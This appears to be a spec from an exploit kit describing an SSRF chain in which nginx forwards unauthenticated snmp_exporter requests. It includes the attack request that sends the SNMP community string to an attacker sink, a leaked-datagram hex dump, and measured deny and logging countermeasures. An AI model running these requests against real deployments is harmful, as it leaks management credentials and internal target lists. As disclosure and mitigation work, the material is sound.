# nginx-snmp-chain

Candidate spec. Mechanism CONFIRMED-mechanism and MEASURED rc=0 (2026-10-09).
Chain measured: `targets/snmp_exporter` RAG items `7abeb15b018a` (bad config,
MEDIDO) and `28f21d087976` (deny contraprobe, MEDIDO).

## Target

A deployment that reverse-proxies `snmp_exporter` through nginx. nginx forwards
`/snmp` unaltered and adds no deny on the query string.

## Mechanism (CONFIRMADO-mecanismo)

- `snmp_exporter` exposes `/snmp?target=<host:port>&auth=<profile>&module=<m>`
  with no HTTP authentication. The `auth` profile selects a configured SNMPv2c
  **community**; the `target` selects the destination. snmp_exporter sends a
  GetBulk to `target` carrying that community in clear.
- A plain nginx `proxy_pass` forwards the request byte-identically, so the
  exporter's SSRF still fires and nginx adds no protection of its own.
- What nginx *adds* is a persistence sink: the default access_log format
  records `$request`, i.e. the full query string. The `target` being probed and
  the `auth` profile invoked are written in clear to
  `/var/log/nginx/access.log` (symlinked to stdout in the stock image).

## PoC (MEASURED 2026-10-09)

`exploit.sh` builds `dolos-nginx-snmp:local` (python:3.12-slim pinned digest +
`snmp/snmpchain.py`), brings up `exporter` (prom/snmp-exporter pin), a real
`device` agent, three nginx instances (bad on published `127.0.0.1:49691`,
`nginx-deny`, `nginx-fixed`) and an `attacker` sink.

| leg | request | measured |
|---|---|---|
| P0 | `exporter/snmp?target=device:16111&auth=mgmt_v2` | HTTP 200; exporter works against the real device |
| P1 | host -> `127.0.0.1:49691/snmp?target=attacker:16110&auth=mgmt_v2&module=mgmt_sysdescr` | attacker sink received **2** datagrams; community recovered from the raw bytes = `SECRETO_SENTINEL_123`; bad-nginx access_log persisted `target=attacker:16110` and `auth=mgmt_v2` |
| C1 | `nginx-deny` (`if ($arg_target != "") { return 403; }`) | HTTP 403, sink delta **0**; access_log **still** records the target |
| C2 | `nginx-fixed` (`if` + args-less `log_format "$request_method $uri"`) | HTTP 403, sink delta **0**, access_log line `"GET /snmp" 403` carries neither target, auth nor secret |

Leaked datagram (hex, `capture/leak-hex.txt`):

```
3037020101 0414 5345435245544f5f53454e54494e454c5f313233 a51c...
                 └─ SECRETO_SENTINEL_123 in clear ─┘
```

`capture/verdict.json`: `p0_exporter_scrapes_device=1`,
`p1_ssrf_community_leaked_to_sink=1`,
`p1_bad_nginx_log_persists_target_and_auth=1`, `c1_deny_only` = {403, delta 0,
log_still_has_target 1}, `c2_deny_plus_argsless_log` = {403, delta 0,
log_hits 0}, `rc=0`.

## The `if` fix is not sufficient (task open question, answered)

The task asks whether `if ($arg_target != "") { return 403; }` is enough. It is
**half** of it:

- It cuts the SSRF: 403 and zero datagrams at the attacker's port (leg C1).
- It does **not** cut the log exposure. The 403 request line still carries the
  full query string, so `target=...` and `auth=...` are still written to disk
  (measured, `log_still_target=1`). nginx logs the request before/independently
  of the `return 403`.
- To remove the log exposure you must also drop the query string from the log
  format (leg C2) or `access_log off`. Only then do both the SSRF and the
  persisted target/auth disappear.

## Impact ceiling

Credential and reconnaissance exposure, not RCE nor a direct read of the
management device.

- The management SNMPv2c community is delivered in clear to a host:port chosen
  by an unauthenticated client (SNMPv2c does not encrypt; the community travels
  in every packet).
- The `target` being probed and the `auth` profile are persisted in nginx's
  access_log, which is commonly shipped to centralised logging: the internal
  target list and the credential handle leak even after the SSRF is blocked by
  the `if`.
- Not demonstrated here: reading the management device with the leaked
  community. That leg is already covered by a separate kit
  (`snmp-exporter/snmp-exporter-read-bypass-leak/`) and is deliberately not
  duplicated.

## Owner

Orquestador, kit exploit-kit-dolos. Chain measured 2026-10-09 (rc=0), including
the two-part contraprobe.
